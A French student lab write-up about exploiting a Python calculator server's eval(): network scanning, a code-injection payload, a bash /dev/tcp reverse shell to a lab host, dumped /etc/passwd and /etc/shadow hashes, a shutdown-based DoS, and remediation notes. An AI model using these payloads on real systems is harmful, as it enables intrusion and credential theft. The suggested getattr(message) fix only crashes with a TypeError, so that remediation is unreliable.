# TP5 : Exploit, pwn, fix

## Sommaire

- [TP5 : Exploit, pwn, fix](#tp5--exploit-pwn-fix)
  - [Sommaire](#sommaire)
  - [1. Reconnaissance](#1-reconnaissance)
  - [2. Exploit](#2-exploit)
  - [3. Reverse shell](#3-reverse-shell)
  - [4. Bonus : DOS](#4-bonus--dos)
  - [II. Remédiation](#ii-remédiation)

## 1. Reconnaissance

🌞 **Déterminer**

- à quelle IP ce client essaie de se co quand on le lance

```
10.1.2.12
```

- à quel port il essaie de se co sur cette IP

```
13337
```

- vous **DEVEZ** trouver une autre méthode que la lecture du code pour obtenir ces infos


Lancer le programme python et regarder sur Wireshark à quelle IP et à quel port le script essaye de se connecter.```

🌞 **Scanner le réseau**

- trouvez une ou plusieurs machines qui héberge une app sur ce port

```
[quentin@localhost ~]$ sudo nmap 10.33.64.0/20 -p 1337 --open

Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-30 10:32 CET
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for 10.33.66.165
Host is up (0.0043s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 56:4C:81:26:BF:C8 (Unknown)

Nmap scan report for 10.33.70.40
Host is up (0.037s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: E4:B3:18:48:36:68 (Intel Corporate)

Nmap scan report for 10.33.76.195
Host is up (0.0043s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 82:30:BF:B6:57:2F (Unknown)

Nmap scan report for 10.33.76.217
Host is up (0.0066s latency).

PORT      STATE SERVICE
13337/tcp open  unknown
MAC Address: 2C:6D:C1:5E:41:6A (Unknown)

Nmap done: 4096 IP addresses (843 hosts up) scanned in 295.53 seconds
```

🦈 **tp5_nmap.pcapng**

- capture Wireshark de votre `nmap`

[Avec filtre TCP](/captures/tp5_nmap.pcapng)

🌞 **Connectez-vous au serveur**

- vous devez déterminer, si c'est pas déjà fait, à quoi sert l'application
```
Une calculatrice qui résout des opérations arithmétiques et qui affiche le résultat dans un fichier log
```

## 2. Exploit

➜ **On est face à une application qui, d'une façon ou d'une autre, prend ce que le user saisit, et l'évalue.**

Ca doit lever un giga red flag dans votre esprit de hacker ça. Tu saisis ce que tu veux, et le serveur le lit et l'interprète.

🌞 **Injecter du code serveur**

- démerdez-vous pour arriver à faire exécuter du code arbitraire au serveur
- tu sais comment te co au serveur, et tu sais que ce que tu lui envoies, il l'évalue
- vous pouvez normalement avoir une injection de code :
  - exécuter du code Python
  - et normalement, exécuter des commandes shell depuis cette injection Python

```cmd
__import__('os').system('ping -c 1 10.1.1.101')
```

[serverIP:10.1.1.100, clientIP:10.1.1.101](captures/ping_injection.pcapng)


## 3. Reverse shell

🌞 **Obtenez un reverse shell sur le serveur**

- si t'as injection de code, t'as sûrement possibilité de pop un reverse shell

```
__import__('os').system('bash -i >& /dev/tcp/10.1.1.101/3333 0>&1')
```
```
└─$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.1.1.101] from (UNKNOWN) [10.1.1.100] 43566
[root@localhost quentin]#
```

🌞 **Pwn**

- voler les fichiers `/etc/shadow` et `/etc/passwd`
```
[root@localhost quentin]# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
sssd:x:998:995:User for sssd:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
chrony:x:997:994:chrony system user:/var/lib/chrony:/sbin/nologin
systemd-oom:x:992:992:systemd Userspace OOM Killer:/:/usr/sbin/nologin
quentin:x:1000:1000::/home/quentin:/bin/bash
tcpdump:x:72:72::/:/sbin/nologin
```
```
[root@localhost quentin]# cat /etc/shadow
root:$6$dbSRBPfwgSi3TNzE$JF3g94rHTYUq1.W650y/feMvu5smAlj45J7X.mtKRvJO4eL8jYebgBXPIcni4wQhiyA.dfrMQP08NCpgyOmex0:19689:0:99999:7:::
bin:*:19469:0:99999:7:::
daemon:*:19469:0:99999:7:::
adm:*:19469:0:99999:7:::
lp:*:19469:0:99999:7:::
sync:*:19469:0:99999:7:::
shutdown:*:19469:0:99999:7:::
halt:*:19469:0:99999:7:::
mail:*:19469:0:99999:7:::
operator:*:19469:0:99999:7:::
games:*:19469:0:99999:7:::
ftp:*:19469:0:99999:7:::
nobody:*:19469:0:99999:7:::
systemd-coredump:!!:19649::::::
dbus:!!:19649::::::
tss:!!:19649::::::
sssd:!!:19649::::::
sshd:!!:19649::::::
chrony:!!:19649::::::
systemd-oom:!*:19649::::::
quentin:$6$p5/s9.JMNbLHwNWv$Y02LXN/BMUdt/tWLTHFK7xaCAWsPn1leTVqCjldyJKx3aXUnUhWjVfEwZFNppc1LGuwVYxW4LhIk64VpaXjoj.:19649:0:99999:7:::
tcpdump:!!:19649::::::
```

- voler le code serveur de l'application

  [code serveur](captures/server.py)

- déterminer si d'autres services sont disponibles sur la machine

```
[root@localhost quentin]# ss -lntp
ss -lntp                                                                                                                                                        
State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                                                               
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=728,fd=3))                                                                        
LISTEN 0      1            0.0.0.0:13337      0.0.0.0:*    users:(("python3",pid=1896,fd=4))                                                                    
LISTEN 0      128             [::]:22            [::]:*    users:(("sshd",pid=728,fd=4)) 
```

## 4. Bonus : DOS

⭐ **BONUS : DOS l'application**

- faut que le service soit indispo, d'une façon ou d'une autre
- fais le crash, fais le sleep, fais le s'arrêter, peu importe

```
[root@localhost quentin]# shutdown -h now
```

## II. Remédiation

🌞 **Proposer une remédiation dév**

```
Ne pas utiliser la méthode eval() qui est vulnérable à l'exécution de code arbitraire mais une autre méthode comme getattr
result = getattr(message)


exemple avec le même reverse shell injecté mais avec la méthode modifié côté serveur :

Un client ('10.1.1.101', 39646) s'est connecté.
Le client ('10.1.1.101', 39646) a envoyé __import__('os').system('bash -i >& /dev/tcp/10.1.1.101/3333 0>&1')
Traceback (most recent call last):
  File "/home/quentin/server.py", line 124, in <module>
    result = getattr(message)
TypeError: getattr expected at least 2 arguments, got 1

```

🌞 **Proposer une remédiation système**

```
- Bloquer les connexion sortantes avec le firewall
- Ne pas utiliser root comme utilisateur sur le server mais plutôt un utilisateur qui aurait seulement les droits nécessaires pour faire fonctionner le service et rien d'autres ailleurs.
```